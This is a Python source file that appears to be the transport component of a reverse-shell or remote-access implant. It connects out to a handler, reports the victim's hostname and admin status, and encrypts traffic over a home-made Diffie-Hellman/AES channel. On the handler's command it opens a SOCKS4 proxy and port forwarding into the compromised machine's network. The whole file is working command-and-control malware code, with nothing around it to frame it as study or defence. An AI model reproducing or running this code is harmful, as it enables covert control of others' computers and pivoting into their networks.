from Crypto.Cipher import AES
from Crypto.Random import random
import Queue
import socket
import time
import hashlib
import zlib
import base64
import logging
from misc import misc
from common import *

class Channel:
	"""
	A channel is essentially two queues, one for inputting data into a thread, one for getting the output. Each channel is identified by a single byte prepended to the data. Usually, data is fed into the chanel by a thread that receives it from the handler, and read from the output by another thread which sends it back.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		self.stale = False
		
		logging.debug("Channel created with ID "+str(ord(self.id)))
		
	def write_input(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
		self.input_queue.put(data)
		
	def read_input(self, blocking=True):
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
			return data
		except Queue.Empty: return None
		
	def write_output(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip()[:100])
		self.output_queue.put(self.id+data)
		
	def signal(self, data):
		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data[:100])
		self.output_queue.put(chr(254)+data)
		
	def __repr__(self):
		return "Channel ID: "+str(ord(self.id))
		
	def __str__(self):
		return self.__repr__()

class Transport:
	""""
	Transport handles connecting to the handler, managing channels, and communicating with the handler. One thread receives data, checks which channel it should be forwarded to, and puts it on the correct queue. Another gets data from a queue all channels write to, and sends it to the handler.
	"""
	def __init__(self, handler_ip, handler_port, key):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		self.auth_key = key
		
		self.comm_socket = socket.socket()
		
		self.master_queue = Queue.Queue()
		self.user_channel = Channel(chr(97), self.master_queue)
		self.signal_channel = Channel(chr(254), self.master_queue)
		
		self.disconnected = False
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}

		
	def connect(self):
		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
		try:
			self.comm_socket.connect((self.handler_ip, self.handler_port))
			logging.info("Connected!")
			self.comm_socket.sendall("NOT A GET REQUEST")
			time.sleep(random.randint(100,500)/100) # Waiting a random amount of time since multiple clients
			self.aes_obj = self.dh_exchange() # connecting at the exact same time causes the handler to hang
			
			data = socket.gethostname()+"|"+str(misc.isadmin())
			
			self.comm_socket.sendall(data)
			
			for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
				t = StoppableThread(target=f)
				t.daemon = True
				t.start()
				
			return True
		except Exception as e:
			logging.warn("Failed to connect to handler: "+str(e))
			return False
			
	def dh_exchange(self):
		"""
		This function sets up a secure connection with the handler using the Diffie-Hellman Exchange.
		"""
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1) # Generate a number 255 digits long
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(str(sharedSecret)+str(self.auth_key)+str(self.comm_socket.getsockname()[1]))).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)

	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data+chr(255))
		except: pass # If we can't send data, the recv function probably already noticed the connection died, and will restart everything soon.
		
	def recv(self):
		if self.disconnected: return ""
		
		try:
			data = ""
			while not data.endswith(chr(255)):
				temp = self.comm_socket.recv(4096)
				if not temp:
					data = None
					break
				data += temp
			data = data[:-1]
		except: data = ""
		
		if not data:
			logging.error("Handler disconnected")
			self.comm_socket.close()
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to handler: "+data[1:][:100])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from handler: "+data.strip()[:100])
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal[:100])
			if signal.startswith("CREATE_CHANNEL"):
				self.create_channel(signal.split(":")[1])
			elif signal.startswith("CREATE_PROXY"):
				ProxyConnection(self.channels[signal.split(":")[1]])
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)

class ProxyConnection:
	"""
	This class is used to create a socksv4 proxy, to forward connections from the handler's to shell's network.
	"""
	def __init__(self, channel):
		self.channel = channel
		self.disconnected = False
		logging.info("Creating new proxy connection. "+repr(self.channel))
		self.disconnected = False
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		logging.debug("Proxy connection starting.")
		data = self.channel.read_input()
		version, type, remote_port, remote_host, user_id = ord(data[0]), ord(data[1]), data[2:4], data[4:8], data[8:-1]
		if version != 4 or type != 1:
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return
			
		port1, port2 = ord(remote_port[0]), ord(remote_port[1])
		self.remote_port = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		self.remote_host = ".".join([str(ord(remote_host[i])) for i in range(4)])
		
		self.remote_socket = socket.socket()
		self.remote_socket.settimeout(20)
		self.connect()
		
	def send(self, data):
		self.channel.write_output(data)
		
	def connect(self):
		try:
			logging.info("Proxy connection on channel #"+str(self.channel.id)+": Connecting to "+str(self.remote_host)+":"+str(self.remote_port)+"...")
			self.remote_socket.connect((self.remote_host, self.remote_port))
			logging.info("Connection successful!")
			self.remote_socket.settimeout(None)
		except:
			logging.info("Connection failed.")
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return

		self.send("\x00\x5A\x00\x00\x00\x00\x00\x00")
		self.relay()
		
	def reader(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.remote_socket.recv(8192)
			if not data:
				self.disconnected = True
				self.channel.stale = True
				return
			self.send(data)
			
	def writer(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.channel.read_input()
			self.remote_socket.sendall(data)
		
	def relay(self):
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
class PortForwarder:
	"""
	This is the reverse of the socks proxy. Instead of talking the socksv4 protocol, it simply binds to a local port and forwards all data to a host specified on creation, proxying it through the handler.
	"""
	def __init__(self, channel, bind_port):
		self.channel = channel # TODO: Make it accept multiple connections!!!!!!
		self.bind_port = bind_port
		self.bind_sock = socket.socket()
		self.disconnected = False
		
		self.bind_sock.bind(("0.0.0.0", self.bind_port))
		self.bind_sock.listen(1)
		
		t = StoppableThread(target=self.run)
		t.daemon = True
		t.start()
		
	def run(self):
		self.client_socket, addr = self.bind_sock.accept()
		
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
		
	def reader(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.client_socket.recv(8192)
			if not data:
				self.disconnected = True
				self.channel.stale = True
				return
			self.send(data)
			
	def writer(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.channel.read_input()
			self.client_socket.sendall(data)
			
